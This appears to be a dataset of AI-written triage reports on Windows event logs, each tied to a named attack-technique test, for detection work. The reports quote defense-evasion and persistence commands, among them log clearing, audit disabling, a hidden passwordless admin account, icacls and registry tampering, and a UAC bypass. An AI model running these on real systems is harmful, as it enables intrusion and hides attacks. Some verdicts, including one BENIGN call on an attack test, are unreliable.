   - All relevant operation and process IDs are consistent, and there are no indications of privilege escalation. These seem to be service account operations (`SERVER002$` and `NT AUTHORITY\SYSTEM`), reinforcing the benign appearance.
   
2. **System Log Analysis:**

   - Events 44 and 43 reflect routine updates for Microsoft Defender Antivirus. The descriptions and versions suggest these are legitimate system maintenance operations, with no sign of interference or tampering.
   
3. **Sysmon Log Analysis:**

   - There are several process creations logged by Sysmon. Most processes are regular Windows executables like `wevtutil`, `conhost`, `cmd.exe`, `whoami.exe`, etc.
   - One log event stands out where `cmd.exe` performs actions such as copying itself to a new location (`C:\lsm.exe`) and executing commands. This could potentially indicate a suspicious activity if `C:\lsm.exe` was meant to hide or obfuscate operations typically not authorized. It's a commonly used tactic in attacks for persisting malicious operations.
   - The `cmd.exe` executes a command to create a text file with contents `data.003`. Although the reason for this copy-and-execution maneuver is unclear, it might warrant further examination to differentiate between legitimate administrative scripts and obfuscated operations.
   
4. **PowerShell Log:** Not provided, therefore, no further analysis was conducted.

5. **Application Log:** Not provided, hence no conclusion can be drawn regarding application-specific activities.

**Overall Assessment:**

The logs predominantly reflect typical system and administrative operations without explicit evidence of compromise. However, the operations surrounding `cmd.exe` executing copies and self-replication in a different directory raise a minor concern over potential malicious activity or suspicious intent due to its commonality in malware tactics.

**Resolution:**

**SUSPICIOUS** - While most activities are benign, the behavior of the `cmd.exe` process cloning and execution could potentially indicate anomalous activity that justifies further investigation. It's recommended to:
   
- Review system processes actively running `lsm.exe` to confirm legitimacy.
- Investigate the logs leading to the execution of `cmd.exe` for context.
- Verify any administrative scripts or scheduled tasks might match the `cmd.exe` execution patterns.
- Conduct a threat-hunting operation or deeper malware scan focusing on file-based anomalies like `lsm.exe` creation.

This cautious approach ensures that the system is not subject to latent threats leveraging subtle modus operandi."
Flush Shimcache,"Upon reviewing the provided logs for the Windows host under investigation, several observations can be made:

1. **Time Change Events:**
   - The security and system logs contain events (Event ID 4616 and 1) indicating a change in system time. These events logged a change in system time twice which were very close together (less than half a second). However, both changes were extremely small and appear to be minor corrections likely associated with NTP (Network Time Protocol) synchronization. These are typically benign and could be related to normal time synchronization activities.

2. **Process Execution Patterns:**
   - The Sysmon logs reveal a number of processes being executed within short succession. Notably, there are several instances of `wevtutil.exe` and `conhost.exe` being invoked by the user `SERVER002\admin_test`. `wevtutil.exe` is a legitimate Windows utility used for managing event logs, typically benign when observed in isolation but potentially noteworthy if used maliciously to tamper with event logs.
   - There is a pattern of PowerShell-like activities where command-line executables like `cmd.exe`, `whoami.exe`, and `rundll32.exe` are invoked, particularly with `cmd.exe` running a command to invoke `rundll32.exe apphelp.dll,ShimFlushCache`. This pattern could be suspicious, especially if `rundll32.exe` is invoked to execute malicious payloads, but the specific command here appears to be linked to flushing application compatibility cache, which can have legitimate uses.

3. **Microsoft Edge Update Activity:**
   - The Sysmon logs contain multiple entries for `MicrosoftEdgeUpdate.exe` executing various commands such as `/svc`, `/update`, and others. The application logs show related messages with `Service stopped` events. These activities suggest legitimate software updates are taking place, specific to Microsoft's Edge browser, which frequently self-updates. This activity appears concurrent with typical scheduled updates and doesn't inherently imply malicious behavior.

4. **Lack of Deviations or Malicious Indicators:**
   - While there are multiple legitimate administrative tasks and processes running, none of them in the logs provide clear evidence of compromise or malicious activity. The presence of high-integrity level processes and system-level activities align with permitted administrative operations and software updates from trusted sources.

Given these observations, the logs primarily depict routine system maintenance and software update activities without explicit indicators of malicious compromise. While the execution of processes like `rundll32.exe` commands deserves attention in a broader context due to the potential for misuse, the specifics here do not categorically signal a threat.

### Conclusion:
- **Resolution**: BENIGN

The activity captured in the event logs appears to align with expected administrative and update behavior on a Windows enterprise environment. There is no direct evidence in these logs pointing towards malicious actions. However, continuous monitoring and routine checks should remain in place to detect any anomalies promptly."
Terminal Server Client Connection History Cleared,"Upon my detailed analysis of the provided log entries, I have identified the following key points that may signal suspicious or potentially malicious activity:

1. **Unusual Use of PowerShell**: In the Sysmon log, there is an execution of `powershell.exe` (ProcessId: 2712) by the user `SERVER002\\admin_test`. While PowerShell is a legitimate tool, its use can be flagged as suspicious if there are no clear benign reasons for its execution, and it's commonly exploited in attacks.

2. **Wevtutil.exe Operations**: The repeated execution of `wevtutil.exe` (ProcessIds: 6884, 6964, 6768, 5752, 5628) by the same user can indicate suspicious activity. `Wevtutil.exe` is often used to query or clear event logs, potentially to cover tracks.

3. **Command Line Registry Manipulations**: There is a `cmd.exe` process executing registry deletions (ProcessId: 4872) with the following command: `""cmd.exe"" /c reg delete ""HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default"" /va /f & reg delete ""HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers"" /f`. This can be suspicious as it involves manipulation of registry keys related to terminal services, which could be used to obfuscate malicious activities.

4. **Multiple Instances of Microsoft Edge Update Components**: Numerous entries involve files and operations associated with Microsoft Edge Update, such as `MicrosoftEdgeUpdateSetup_X86_1.3.195.27.exe` and `MicrosoftEdgeUpdate.exe`. While these entries might typically indicate routine updates, the frequency and immediacy of these logs are worth considering in the broader context with the other suspicious activities.

5. **Event with `whoami.exe`**: The execution of `whoami.exe` is often legitimate, but in the context of other potential malicious activities, it could be significant as attackers typically use such commands to determine the current user's permissions.

6. **High Integrity Level Process Invocations**: Several processes are executed with 'High' integrity, usually indicating administrative privileges which, if misused, could lead to privilege escalation attempts.

### Assessment:
The identified behaviors in the logs, particularly the unusual use of PowerShell, registry manipulations via CMD, and potential attempts to cover tracks with `wevtutil.exe`, suggest a pattern consistent with security anomalies that warrant further investigation.

### Resolution:
**SUSPICIOUS** - While there's no definitive single indicator that confirms malicious intent, the combination of processes and their context raises suspicion and should not be ignored. 

### Recommendations:
- Conduct a thorough investigation by cross-referencing with the available context and behavioral baselines for the environment.
- Investigate the purpose and content of the executed PowerShell scripts.
- Check for any legitimate maintenance or update activities that correspond with the Edge Update processes.
- Verify the registry changes for authorized administrative activities or signs of tampering.
- Enhance the monitoring of this host with particular focus on script executions and registry modifications.
- Consider network traffic analysis to check for any data exfiltration or command and control activities.

Further detailed investigation will help clarify whether these activities are benign or part of a more complex malicious operation."
Running DLL with .init extension and function,"### Analysis

Upon reviewing the provided Windows event logs, the following observations and indicators have been identified:

1. **Suspicious Use of rundll32.exe**: In the PowerShell and Sysmon logs, multiple entries refer to the use of `rundll32.exe` with a command line pointing to a suspicious path:
   - `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.011\bin\_WT.init,krnl`.
   - The path refers to a temporary directory, which is unconventional for trusted system DLLs. This might indicate the execution of malicious or untrusted code, especially since `rundll32.exe` can be leveraged to run DLLs that might contain harmful code.

2. **Processes Executed in Temp Folder**: Many processes are initiated from what appears to be a temporary directory (`C:\Users\ADMIN_~1\AppData\Local\Temp\`), which is typically suspicious because legitimate applications rarely execute code from Temp folders.

3. **PowerShell Log Entries**: Repeated PowerShell event logs (EventID 600) indicate multiple components (`Alias`, `Registry`, `Environment`, `FileSystem`, `Function`, `Variable`, `Certificate`, `WSMan`) being started under the same rundll32.exe execution context as above. However, there are no specific commands logged, which could indicate an attempt to obfuscate activity.

4. **Sysmon Log Entries**: Process events corresponding to executions of `cmd.exe`, `rundll32.exe`, and `conhost.exe` seen in the Sysmon logs support the suspicious rundll32.exe activity that was identified in the PowerShell log. 
   - The command line shows `cmd.exe` being used to execute `rundll32.exe`, further evidencing the possible execution of malicious code.

5. **Integrity Level and User Context**: The processes were executed under a high integrity level with the user context of `SERVER002\admin_test`. This suggests that the processes have elevated permissions, which could be used to bypass security measures on the system.

6. **Common Utilities Execution**: The presence of `wevtutil.exe`, `whoami.exe`, and `svchost.exe` are generally legitimate but can be indicative of system reconnaissance or administrative actions when examined in conjunction with other suspicious activities.

7. **Absence of Security Logging and System Logs**: The absence of Security logs indicates there might have been failures or attempts to conceal activities, as one would typically expect logs under normal conditions.  

### Assessment

The combination of using `rundll32.exe` from a temporary directory, the execution pattern observed, and the lack of detailed command logging in PowerShell scripts raises significant suspicion that malicious activities are taking place.

- The execution from a Temp directory with a common Windows utility (`rundll32.exe`) is a well-known tactic used in fileless malware attacks.
- The fact that these activities occur under a high integrity level and within an administrative user context increases the potential risk since it allows the execution of harmful processes that can manipulate system-level settings.

### Resolution

**SUSPICIOUS**

Due to the suspicious execution patterns and context, further investigation is needed. Actions to take may include:

- **Conduct a thorough investigation on `Server002`**: Focus on verifying the authenticity and necessity of .dlls or scripts found in the `C:\Users\ADMIN_~1\AppData\Local\Temp\` directory.
- **Network Monitoring**: Check for unusual outbound traffic or connections associated with this host, which might indicate the presence of malware contacting a command-and-control server.
- **Endpoint Security Tools**: Utilize security tools to perform memory scans for malware, and check for known IOCs (Indicators of Compromise).
- **User Access Review**: Audit the `admin_test` account usage and review who has access to this account, or if there is a compromise.

In conclusion, while the logs do not conclusively prove malicious activity, the indicators strongly suggest that further investigation is warranted."
Execution from Compressed JScript File,"Upon analysis of the provided logs:

### System Log:
- **WindowsUpdateClient events**:
  These events show a Windows Update activity related to the ""Security Intelligence Update for Microsoft Defender Antivirus"", which is normal and expected for system patching and security updates. Nothing suspicious here.

### Sysmon Log:
- **Process Creation**:
  - Multiple instances of `conhost.exe` and `wevtutil.exe` processes being created, which can be part of typical operations. However, the repetition needs to be checked against normal behavioral baselines.
  
  - Notably, there is the execution of `cmd.exe` with a command line referring to a JavaScript file located in a temp path:
    ```
    ""cmd.exe"" /c ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\temp_datajs.zip\\datajs.js""
    ```
    This is suspicious because:
    - It involves scripts (`wscript.exe` executing `datajs.js`), which can potentially be used for further malicious actions.
    - The command involves `cmd.exe` invoking a script that is placed inside a temporarily named directory structure.

  - `calc.exe` execution could be part of normal or a test activity if invoked by the user, but its parent process is `wscript.exe` with `temp_datajs.zip\\datajs.js`, which corroborates the suspicious scripting activity described above.

### Application Log:
- Shows that Windows Defender is active and running, which is a good sign for security monitoring, but doesn't provide information on other activities.

### Security Log:
- **Credential Validation Failures (Event ID 5379)**:
  - Repeated failures related to credential validation for a `MicrosoftAccount:user=02txoixylodcstop` might expose unsuccessful attempts to validate or access a Microsoft Account. The return code `3221226021` indicates ""The user name or password is incorrect"", which might need closer examination for brute-force attempts.

### Overall Assessment:
- **Suspicious Activities**:
  - The scripting activity involving `datajs.js` being executed in a temporary directory using `wscript.exe`, initiated by `cmd.exe`, is notably suspicious and could indicate the presence of a script-based attack vector.
  - The failed credential access attempts might warrant further investigation, especially if some of these logs co-relate with unauthorized access attempts or workflows within the organization.

### Resolution:
- **SUSPICIOUS**:
  The logs present suspicious behavior with potential indicators of script execution that could be malicious, alongside credential validation failures. Further investigation should involve:
  - Reviewing the contents of `datajs.js` if available and understanding its origin and purpose.
  - Verifying the source and context of credential validation attempts.
  - Checking user activity logs and anomaly detection settings to ensure alignment with expected usage and security policies.
  - Conducting a deeper forensic analysis on potential indicators and behavior profiles around the reported timeframe."
Office 365 - Exchange Audit Log Disabled,"Based on the analysis of the provided log entries across multiple logs (System, Windows PowerShell, Sysmon, Application, and Security), here are the findings:

### Suspicious or Anomalous Behavior:

1. **PowerShell Activity**:
   - The logs show PowerShell command execution with the following command line: 
     ```shell
     powershell.exe &amp; {$secure_pwd = \""\"" | ConvertTo-SecureString -AsPlainText -Force
     $creds = New-Object System.Management.Automation.PSCredential -ArgumentList \""\"", $secure_pwd
     Connect-ExchangeOnline -Credential $creds
     Set-AdminAuditLogConfig -UnifiedAuditLogIngestionEnabled $False}
     ```
   - This PowerShell script seems to disable audit log ingestion, which can be suspicious as it may be indicative of attempts to hide actions from being logged.

2. **Sysmon Activity**:
   - We see multiple instances of `wevtutil.exe` and `conhost.exe` under the user ""SERVER002\\admin_test"". 
   - `wevtutil.exe` is generally used to manage Windows Event logs, and excessive or concurrent instances may warrant further investigation in cases of obfuscation or data exfiltration attempts.
   - The presence of `whoami.exe` and `hostname.exe` suggests potential recon activity, as a way to gather information on the host.

3. **Security Log Activity**:
   - Several instances of Event ID 4798, relating to the enumeration of user accounts, were generated by `CompatTelRunner.exe`. While `CompatTelRunner.exe` is a legitimate Windows process related to telemetry, using it to enumerate accounts can be concerning if not expected in your environment.
   - The log shows a process `CompatTelRunner.exe` querying different user accounts under a SYSTEM context.
   - Event ID 4672 indicates special privileges were assigned to the SYSTEM user, which can be typical but should be correlated with other activities for anomalies.

### Assessment and Resolution:

Based on the provided logs, there are several indicators that suggest potential malicious activity:

- **Process Execution**: The PowerShell script disabling the audit log ingestion.
- **Reconnaissance Activity**: Use of system binaries like `whoami.exe`, `hostname.exe`, and `wevtutil.exe`, which in the context of other activities could suggest reconnaissance efforts.
- **Account Enumeration**: Activities involving enumerating user accounts using `CompatTelRunner.exe`, though legitimate, might reveal potential misuse or exploitation if it deviates from expected behavior.

### Conclusion: **SUSPICIOUS**

- The observed PowerShell script, along with excessive system process activities and user enumeration, looks suspicious and warrants further investigation.
- It is advised to escalate this to conduct a thorough investigation to assess the intent and identify any possible compromises or unauthorized activities:
  1. Verify the script execution context, and determine if it's necessary and authorized.
  2. Review user activities and system logs for any further evidence of unauthorized or malicious behavior.
  3. If necessary, perform a security audit and vulnerability assessment on the host system.

This analysis acknowledges the potential for unauthorized activity without definitive proof of malicious intent, therefore categorizing the findings as **SUSPICIOUS**."
Event Log Manipulations- Time slipping via Powershell,"After conducting a thorough analysis of the provided Windows event logs, I identified a noteworthy event that stands out and could be indicative of malicious activity:

### Key Findings:
1. **Time Manipulation using PowerShell**
   - **Event Detail**: On `2024-10-23 15:14:47.686`, a PowerShell command was executed to modify the system date by adding three days: `""powershell.exe"" & {try{ , Set-Date -Date (Get-Date).AddDays(3), Add-Content \""\""$env:APPDATA\\slipDays.bak\""\"" 3, }, catch {exit 1}}`.
   - **Significance**: Time manipulation is highly suspicious as it can be used to evade detection by altering timestamps for various operations. This behavior is often associated with malicious activities, such as tampering with log files to cover tracks or interfering with system operations.

2. **Consistent High-Integrity Process Executions**
   - Multiple processes including `wevtutil.exe` and `conhost.exe` were executed under a high-integrity level by the user `SERVER002\admin_test`. While these processes are typically benign, their frequent and close consecutive executions, especially after the PowerShell command, warrant further scrutiny to ensure they were not leveraged for unauthorized actions.

3. **Frequent Privileged Access Events**
   - Observations of multiple high-privilege assignments and new logon sessions with administrative privileges for the same user in quick succession. These events could indicate a potential for lateral movement or privilege escalation attempts.

### Assessment:
Based on the identified actions, there is significant evidence of **SUSPICIOUS** activity, particularly the intentional manipulation of system time via PowerShell. This activity, while not categorically malicious on its own, is highly unusual and warrants further investigation to rule out any potential compromise or unauthorized use of administrative credentials.

### Recommended Actions:
- **Immediate Review**: Conduct a detailed examination of user `admin_test` activities surrounding the time of the PowerShell execution to determine if any other unauthorized or anomalous actions were taken.
- **Log Analysis & Correlation**: Cross-reference with network logs, firewall logs, and any endpoint detection alerts around the time of this event.
- **Security Policy Review**: Verify and enforce strict PowerShell execution policies and monitor high-integrity process executions.
- **User and Privilege Audit**: Ensure that only necessary users have elevated privileges and review logs for any further evidence of privilege misuse.

Final Resolution: **SUSPICIOUS**.
Further investigation is needed to determine the intent and scope of the activity observed."
Grant Full Access to folder for Everyone - Ryuk Ransomware Style,"Based on the logs provided, I have conducted an in-depth analysis focusing on various aspects that could potentially indicate suspicious or malicious behavior. The analysis identifies certain actions that fall into the categories of process execution, command-line activities, and system changes that warrant a closer look.

### Analysis:
1. **Command-Line Activity:**
   - A command-line operation is observed where ""cmd.exe"" is executed with an ""icacls"" command, which modifies file permissions recursively, granting ""Everyone"" full access to ""C:\Users\Public\"". This is a potential security risk as it modifies access control lists (ACLs) in a way that can expose sensitive data or critical system files to unauthorized access or malicious alterations.
   - Command: `cmd.exe /c icacls ""C:\\Users\\Public\\*"" /grant Everyone:F /T /C /Q`

2. **Process Activity:**
   - Frequent executions of ""MicrosoftEdgeUpdate.exe"" and related update processes are observed. Typically, such update processes are not suspicious by themselves; however, it is important to validate that these are legitimate and expected. They appear under ""NT AUTHORITY\SYSTEM,"" which is normal for such updates.
   
3. **Sysmon Events:**
   - Multiple instances of processes such as ""wevtutil.exe,"" ""conhost.exe,"" and utility queries like ""whoami.exe"" and ""hostname.exe"" appear as executed. These are generally benign and part of typical administrative tasks, but numerous executions in a short timeframe might warrant verifying if they align with expected administrator activities.

4. **Time Change Events:**
   - There are system time changes logged (EventID 4616). Alterations to system time can, in some contexts, be indicative of anti-forensic behavior, especially if done by unauthorized processes. However, this event is executed by ""svchost.exe,"" which is part of normal Windows time synchronization under the ""LOCAL SERVICE.""
   
5. **No Direct Malicious Indicators:**
   - There are no direct indicators of malware, such as known malicious hashes, unusual network communications, or atypical process injections or privilege escalations.

### Assessment:
- **SUSPICIOUS**: While most activities recorded in the logs can be attributed to benign system and administrative processes, the use of `icacls` to grant broad file permissions raises a red flag. This activity could open the system to various threats if it was not performed by an authorized and knowledgeable administrator for a legitimate reason.


### Recommendations:
1. **Access Verification**:
   - Validate with administration logs or directly with system administrators if the change to file permissions using `icacls` was intentional and needed. Investigate the reason behind this action.

2. **Legitimacy Check**:
   - Ensure that the numerous EdgeUpdate processes are expected and legitimate. Confirm with the software update schedule and check if they align with software patch rollout.

3. **Monitoring**:
   - Set up alerts for future similar icacls commands to ensure unauthorized changes to file permissions are quickly identified and assessed.

4. **Audit Logs**:
   - Continuously monitor Sysmon and other security logs for any patterns or sequences that resemble exploration or exploitation, especially if new anomalies arise.

This collective assessment, coupled with the specific notes on suspicious behavior, should guide further validation and proactive security measures."

Delete System Logs Using Clear-EventLog,"**Analysis of the Logs:**

1. **System Log:**
   - The entries in the system log are mostly related to time changes and the synchronization of system time with an NTP server (`time.windows.com`). These changes appear to be consistent and do not indicate any direct malicious activity at this level.
   - The presence of `svchost.exe` in altering timestamps is common and can be part of regular system operations or service activities.

2. **Sysmon Log:**
   - There are several instances where common administrative and maintenance tasks are logged, such as launching `whoami.exe` and `hostname.exe`. While these are legitimate system tools, frequent use, especially by unauthorized users, can be suspicious. However, these do not inherently appear malicious in this context.
   - Critical events include the execution of `powershell.exe` with a command that clears Windows Event Logs. This action is highly suspicious as attackers frequently clear event logs to hide malicious activity and footprints.
   - The execution of multiple `wevtutil.exe` processes, which is the utility used to clear event logs, corroborates the suspicious activity identified with PowerShell.
   - While Microsoft's Edge Update is seen executing several processes, this appears consistent with standard Microsoft Edge update activities and is not inherently malicious.

3. **Application Log:**
   - The entries for the application log are related to service stops for Edge Update, which coincide with the Sysmon log entries showing EdgeUpdate processes executing. This is normal behavior for update processes and does not indicate malicious activity.

4. **Security Log:**
   - The security logs indicate an expected time change activity where `svchost.exe` contributed. The entries here do not suggest suspicious activity beyond the normal system functions.

5. **Windows PowerShell Log:**
   - The PowerShell log confirms the stopping of a PowerShell session where a script is executed to clear the event logs. This supports the Sysmon logs indicating the event log clearing, marking it as a highly suspicious or potentially malicious operation.

**Assessment and Resolution:**
- **Suspicious Activities Identified:** 
  - The key concern is the execution of PowerShell script(s) to clear event logs. The use of `Get-EventLog`, `Clear-EventLog` commands clearly indicates attempts to remove traces of activities, which is often associated with malicious intent or unauthorized actions.

- **Resolution: SUSPICIOUS**
  - Based on the analysis, the logs contain suspicious activity, specifically the clearing of event logs using PowerShell. This behavior needs further investigation to verify the legitimacy of the action and determine if malicious activity occurred.

**Guidance on How to Proceed:**

Create an Administratoruser (with a space on the end),"**Detailed Analysis of the Logs:**

Upon reviewing the provided Windows event logs, several indicators of potentially suspicious or malicious activity stand out:

1. **Suspicious PowerShell Command:**
   - There are several events captured in both Sysmon and PowerShell event logs indicating the execution of a PowerShell command: `powershell.exe & {New-LocalUser -Name \""Administrator \"" -NoPassword}`. This command attempts to create a new local user named ""Administrator "" without a password, which is an unusual activity and a potential security risk.

2. **Security Log Events:**
   - Event 4720: A new user account (""Administrator "") was created.
   - Event 4728: Indicates adding this new account to a group.
   - The username ""Administrator "" with a trailing space appears in logs and does not follow standard naming conventions. This could indicate an attempt to create a hidden or overlooked administrative account.

3. **Process Execution Related to Privileged Operation:**
   - Both `hostname.exe` and `whoami.exe` are executed, which might be used by an attacker for reconnaissance or understanding the environment.

4. **Time Change Event:**
   - There are Time Change events captured (EventID 4616 in the Security log and Kernel-General events in System log), indicating possibly unauthorized time changes. Attackers sometimes modify system time to evade detection or logging mechanisms.

5. **Edge Update Executions:**
   - The series of executions related to `MicrosoftEdgeUpdate.exe` and its subcomponents appear in the logs. While Edge updates are normally routine, the timing and context (in conjunction with the suspicious PowerShell command and user account creation) could indicate an attempt to mask activities or leverage legitimate processes in unauthorized activities.

**Assessment:**

The execution of a PowerShell script to create a new administrator account without a password, the unusual activity surrounding user account manipulations, and process executions like `hostname.exe`, `whoami.exe`, combined with unauthorized time changes, significantly elevate the suspicion level. These activities suggest an attempt at privilege escalation or establishing persistence through a malicious backdoor account.

**Guidance on How to Proceed:**

1. **Immediate Actions:**
   - Disable or delete the suspicious ""Administrator "" account.
   - Inspect any related systems for other unauthorized accounts or changes in user account controls.
   - Investigate the source and method of the PowerShell command execution to prevent recurrence.

2. **Further Investigation:**
   - Analyze network traffic and system changes around this timeframe to identify any lateral movements or data exfiltration.
   - Review system and application logs comprehensively to ensure no further tampering has occurred.
   - Check for additional malicious scripts or executables, especially in temporary or user directories.

3. **Implement Security Measures:**
   - Enforce stricter PowerShell logging and script execution policies.
   - Regularly review and audit user account changes and privileges.
   - Utilize Application Control policies to prevent unauthorized software execution.

**Finalizes as: MALICIOUS**

The combined evidence in the logs strongly indicates malicious intent and activity, warranting an urgent security response and remediation effort."
Masquerade as a built-in system executable,"After examining the provided event logs from the Windows host, several observations stand out, particularly within the PowerShell logs and Sysmon events:

### Windows PowerShell Log Analysis:
- The PowerShell logs indicate the creation and execution of a .NET assembly using `Add-Type -TypeDefinition`. The assembly is being output to a file named `svchost.exe` under the `C:\Windows\Temp\` directory. This behavior is strange and potentially malicious for the following reasons:
  - Using `Add-Type` to dynamically compile and execute .NET code is often associated with malware and fileless attacks.
  - The choice of the output file name `svchost.exe` is suspicious since `svchost.exe` is a legitimate Windows system process usually found in `C:\Windows\System32`, not the Temp directory. Attackers often use legitimate-sounding names to disguise malicious files.
  - Executing a newly created executable (`svchost.exe`) right after compiling it adds to the suspicion, as this is a known tactic for running malicious payloads without detection.

### Sysmon Log Analysis:
- Multiple instances of known Windows processes like `conhost.exe`, `wevtutil.exe`, `hostname.exe`, and `whoami.exe` are launched by the same user (`SERVER002\admin_test`). While the execution of such processes isn't uncommon, their clustered execution at almost the same time suggests they might be involved in a scripted process or automated task.
- The execution of `powershell.exe` using the command line `\""powershell.exe\"" & {Add-Type -TypeDefinition @'... Start-Process -FilePath \""$Env:windir\\Temp\\svchost.exe\""}` matches the activity in the PowerShell log and involves dynamic code execution, reinforcing the likelihood that this is a malicious activity.

### Security, System, and Application Log Analysis:
- No additional suspicious behavior was notable in the Security, System, or Application logs that directly correlates with the suspicious PowerShell activity.

### Conclusion:
Given the suspicious use of `Add-Type` in PowerShell to dynamically compile and execute an executable named `svchost.exe` in a non-standard directory, the behavior aligns with techniques used in malicious PowerShell scripts or fileless malware attacks. The presence of legitimate Windows processes running in rapid succession could support the hypothesis of a compromise, but in isolation, they are not definitive indicators.

### Resolution:
- **MALICIOUS**: The activity observed in the PowerShell logs is highly indicative of potentially malicious actions. Immediate action should be taken to isolate the affected system and conduct further forensic investigation to determine the extent of the compromise. It is recommended to examine the contents of `C:\Windows\Temp\svchost.exe` and any associated artifacts. Additionally, reviewing network logs and endpoint activity would help determine if there was lateral movement or data exfiltration associated with this execution."
Event Viewer Registry Modification - Redirection Program,"Upon detailed analysis of the provided Windows event logs, several aspects require consideration to determine if any activity is potentially malicious or suspicious:

### Key Observations:

1. **Use of `cmd.exe`** with the command line arguments indicating registry modification:
   - The use of `cmd.exe` to modify the registry with the command 
     ```
     reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Event Viewer"" /v MicrosoftRedirectionProgram /t REG_EXPAND_SZ /d ""C:\windows\system32\notepad.exe"" /f
     ```
   - This action is highly suspicious as it redirects attempts to open Event Viewer to Notepad, possibly as an evasion technique to prevent analysis of the event logs.

2. **Frequent Execution of Core Utilities:**
   - Multiple instances of `wevtutil.exe` and `conhost.exe` are recorded. While it's not uncommon for these utilities to be executed, the repeated and nearly simultaneous occurrences suggest a script or program might be automating their execution, potentially indicative of post-compromise activity.

3. **Execution of `hostname.exe` and `whoami.exe`:**
   - The execution of `hostname.exe` and `whoami.exe` sequentially could suggest an attempt to gather system information, typical of reconnaissance commands executed by malicious scripts or actors.

4. **User with High Privilege:**
   - The user `SERVER002\admin_test` executed all these processes. Additionally, this user possesses extensive privileges such as `SeDebugPrivilege` and `SeLoadDriverPrivilege`, which are potent for system manipulation.

5. **Time Change Events:**
   - There are `Kernel-General` and `Security` events indicating changes in system time, `NewTime` and `OldTime`, which coincide with suspicious command executions. This could be an attempt to manipulate timestamps as a part of anti-forensics measures.

### Conclusion:
Given the modification of the registry to manipulate Event Viewer access, frequent executions of utilities for potential reconnaissance or evasion, and the use of a highly privileged account, there are significant indicators of potentially **malicious activity**. These actions are not typical for regular administrative tasks and indicate possible compromise or misconfiguration being leveraged for evasion techniques.

### Recommendation:
- Immediate investigation into the `admin_test` user account activity and potential compromise.
- Inspect the current registry changes made and reverse them if not required by legitimate administrative activities.
- Review current security policies for logging and alerting any registry or system-level changes.
- Conduct a thorough sweep of the system and network for related indicators of compromise, considering the suspicious sequences and regedit activities.

**Final Resolution: MALICIOUS** - Evidence in the logs strongly indicates malicious activity, particularly with the registry modification to obscure visibility into the system's logging functionality. Urgent action is recommended."
UACME Bypass Method 34,"Analyzing the provided logs, the following observations have been made:

1. **Sysmon Logs:**
   - There are multiple entries related to the execution of command-line utilities such as `cmd.exe`, which are commonly used for scripting and administrative tasks. 
   - We observe the execution of a command involving `uacme` and `Akagi64.exe`. UACMe is known to be a toolset that exploits User Account Control (UAC) to achieve elevated privilege without displaying a UAC prompt.
   - The execution of `cmd.exe` with command lines referencing paths like `C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\\Externalfiles\\uacme\\34 Akagi64.exe` is suspicious, as it suggests potential privilege escalation attempt.
   - The parent process of these suspicious commands is `powershell.exe`, which executed a script checking the path to `Akagi64.exe`, indicating scripted execution potentially aimed at bypassing UAC.

2. **Application Logs:**
   - The logs show typical service activities, such as the `edgeupdate` service stopping and `Windows Defender` reporting security product state as ""ON"". These actions are generally benign and indicate normal system operations.
  
3. **Security Logs:**
   - Not provided in the data.

4. **Windows PowerShell Logs:**
   - Not provided in the data.

**Assessment:**
- The recurring command-line executions involving `uacme`, `Akagi64.exe`, and paths within `AppData\Local\Temp` directories indicate potential privilege escalation activities and attempts to evade UAC.
- Such activities suggest a suspicious intent, aligned with tools that enable privilege escalation.

**Resolution: SUSPICIOUS**

**Guidance on How to Proceed:**
1. **Conduct Further Investigation:**
   - Confirm the legitimacy of the `Akagi64.exe` tool and other `uacme` related files through signature verification and review of their origin.
   - Examine the account activities for `admin_test`, focusing on any anomalous actions or role changes.

2. **Audit and Cleanup:**
   - Check for other instances or related scripts within `AppData\Local\Temp` and similar directories.
   - Conduct a threat hunt across the network to detect any other instances of similar behavior.

3. **Mitigate Potential Risks:**
   - If identified as needed, remove any discovered files associated with this activity.
   - Review and enforce security policies around the use of command line utilities and scripts.

4. **Incident Response:**
   - If confirmed malicious, engage the incident response team to contain and remediate the potential breach.
   - Ensure logs are kept for forensic analysis and further understanding of the threat vector.

5. **User Education and System Hardening:**
   - Educate users on safe practices for executing scripts and using administrative tools.
   - Review and strengthen privilege escalation controls, such as UAC settings and execution policies."
Execution of program.exe as service with unquoted service path,"Upon reviewing the provided Windows event logs, we can determine the following:

1. **Security Log Analysis:**
   - The security log events with EventID 4616 indicate a time change on the system. Changes in system time can sometimes be suspicious if not expected, as attackers may manipulate time settings to evade detection. However, in this context, there's no additional information to suggest malicious activity solely based on these logs.

2. **Sysmon Log Analysis:**
   - Numerous Sysmon events are recorded, specifically with EventID 5 (Process Termination) and EventID 1 (Process Creation). Notably, there's a process creation event for `cmd.exe` executing a series of commands that copy a file, create a service (`Example Service`), and starts it (EventID 17979). This script:
     ```
     cmd.exe /c copy ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.009\\bin\\WindowsServiceExample.exe"" ""C:\\Program Files\\windows_service.exe"" & copy ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.009\\bin\\WindowsServiceExample.exe"" ""C:\\program.exe"" & sc create ""Example Service"" binpath= ""C:\\Program Files\\windows_service.exe"" Displayname= ""Example Service"" start= auto & sc start ""Example Service""
     ```
     is suspicious because creating and starting services can be an indicator of persistence mechanisms used by malware.

3. **System Log Analysis:**
   - The two main events of note are EventID 7045, indicating that the service `Example Service` was installed, and EventID 7000, indicating that this service could not start correctly (%%2 typically refers to a general error).
   - The installation of a service aligns with the suspicious process observed in the Sysmon log, adding to the concern.

4. **Application Log and Other Logs:**
   - The Application log does not provide significant additional insights into possible malicious behavior beyond what's indicated in the other logs.

**Assessment:**
- The event involving `cmd.exe` setting up and starting a new service aligns with malicious behaviors related to persistence techniques. The unauthorized or suspicious creation of services, particularly from a temporary directory and by an administrative account in a highly privileged integrity level, is a red flag.

**Resolution: MALICIOUS**
The logs contain evidence of potentially malicious activity involving the creation of a new Windows service from an unusual file path, which is generally characteristic of a compromise or malware persistence method. Immediate action should be taken to investigate the origin and intent of the `WindowsServiceExample.exe` and to verify the integrity and purpose of the changes made to the service setup.

**Guidance:**
- Quarantine the affected system to prevent any potential spread of malicious activity.
- Conduct further forensic analysis on `WindowsServiceExample.exe` to ascertain its legitimacy or potential threat.
- Review related user activities and recent changes in the network environment for further indications of compromise.

